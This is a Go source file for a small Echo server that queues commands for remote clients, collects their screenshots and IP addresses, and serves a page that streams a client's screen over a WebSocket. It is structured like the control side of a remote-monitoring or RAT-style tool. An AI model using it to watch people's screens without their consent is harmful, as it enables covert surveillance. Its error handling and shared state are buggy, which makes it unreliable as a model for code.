package main

import (
	"bytes"
	"fmt"
	"github.com/labstack/echo/v4"
	"net/http"
	"time"
)

var (
	ActualCommand    []Command
	ActualClient     []string
	ActualScreenshot = bytes.Buffer{}
	ActualClientIp   string
)

const getActiveClientsCommand = "get_active_clients"
const getScreenshotCommand = "get_screenshot"
const exitCommand = "exit"
const getStreamCommand = "get_stream"

type Command struct {
	Id         int
	Type       string
	ClientName string
}

func main() {
	/*go func() { //Очищаем списки
		for {
			ActualCommand = []Command{}
			ActualClient = []string{}
			ActualScreenshot = bytes.Buffer{}
			fmt.Println("Списки очистились")
			time.Sleep(time.Second * 15)
		}
	}()*/

	e := echo.New()

	e.GET("/ActualCommand/", getActualCommand)
	e.GET("/ActiveClients/", getActiveClients)
	e.GET("/Screenshot/:name", getScreenshot)
	e.GET("/Exit/", exit)
	e.GET("/Stream/:name", getStream)

	e.POST("/ActiveClients/", postActiveClient)
	e.POST("/Screenshot/", postScreenshot)
	e.POST("/Stream/", postClientIP)

	e.Logger.Fatal(e.Start(""))
}

func getActualCommand(c echo.Context) error {
	return c.JSON(http.StatusOK, ActualCommand)
}

func getActiveClients(c echo.Context) error {
	ActualCommand = append(ActualCommand, Command{Id: len(ActualCommand), Type: getActiveClientsCommand})
	fmt.Println(ActualCommand)
	time.Sleep(time.Second * 2)
	var actualClients string
	for _, val := range ActualClient {
		actualClients += val + ""
	}
	return c.String(http.StatusOK, actualClients)
}

func getScreenshot(c echo.Context) error {
	name := c.Param("name")
	ActualCommand = append(ActualCommand, Command{Id: len(ActualCommand), Type: getScreenshotCommand, ClientName: name})
	fmt.Println(ActualCommand)
	time.Sleep(time.Second * 2)
	return c.Blob(http.StatusOK, "image/png", ActualScreenshot.Bytes())
}

func getStream(c echo.Context) error {
	name := c.Param("name")
	ActualCommand = append(ActualCommand, Command{Id: len(ActualCommand), Type: getStreamCommand, ClientName: name})
	time.Sleep(time.Second * 2)
	htmlResponse := "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>WebSocket</title></head><body><p id=\"output\"></p><canvas id=\"canvas\" width=\"900\" height=\"450\" ></canvas><script>ws = new WebSocket('ws://" + ActualClientIp + ":1488/ws');    ws.onopen = function() {        console.log('Connected')    };    ws.onmessage = function(evt) {        var canvas = document.getElementById('canvas');        var context = canvas.getContext('2d');        var img = new Image();        var reader = new FileReader();        reader.readAsDataURL(evt.data);        reader.onloadend = function() {var base64data = reader.result;img.onload = function() {    context.drawImage(this, 0, 0, canvas.width, canvas.height);}img.src = base64data;        }    };</script></body></html>"
	return c.HTML(http.StatusOK, htmlResponse)
}

func exit(c echo.Context) error {
	ActualCommand = append(ActualCommand, Command{Id: len(ActualCommand), Type: exitCommand})
	fmt.Println(ActualCommand)
	return c.String(http.StatusOK, "Ok")
}

func postActiveClient(c echo.Context) error {
	name := c.FormValue("name")
	for _, val := range ActualClient {
		if val == name {
			return c.NoContent(http.StatusConflict)
		}
	}
	ActualClient = append(ActualClient, name)
	return c.NoContent(http.StatusOK)
}
func postScreenshot(c echo.Context) error {
	screenshot, err := c.FormFile("screenshot")
	if err != nil {
		fmt.Println(err)
	}
	file, err := screenshot.Open()
	defer file.Close()
	if err != nil {
		fmt.Println(err)
	}
	ActualScreenshot.ReadFrom(file)
	return c.NoContent(http.StatusOK)
}

func postClientIP(c echo.Context) error {
	ActualClientIp = c.FormValue("ip")
	return c.NoContent(http.StatusOK)
}
